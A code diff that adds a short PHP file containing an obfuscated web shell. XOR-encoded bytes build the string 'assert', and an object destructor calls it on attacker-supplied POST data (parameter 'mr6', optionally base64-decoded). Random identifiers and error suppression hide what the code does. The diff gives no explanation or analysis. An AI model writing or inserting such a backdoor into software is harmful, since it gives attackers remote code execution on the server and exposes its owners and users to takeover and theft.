@@ -1,0 +1,20 @@
+<?php 
+class EEFS { 
+    function VyRp() {
+        $CTMG = "\x4f" ^ "\x2e";
+        $CjsP = "\x7e" ^ "\xd";
+        $ePoW = "\xb5" ^ "\xc6";
+        $YGsF = "\x20" ^ "\x45";
+        $xHeJ = "\xf9" ^ "\x8b";
+        $EumN = "\xd7" ^ "\xa3";
+        $jQMb =$CTMG.$CjsP.$ePoW.$YGsF.$xHeJ.$EumN;
+        return $jQMb;
+    }
+    function __destruct(){
+        $zsSg=$this->VyRp();
+        @$zsSg($this->Wm);
+    }
+}
+$eefs = new EEFS();
+@$eefs->Wm = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
+?>
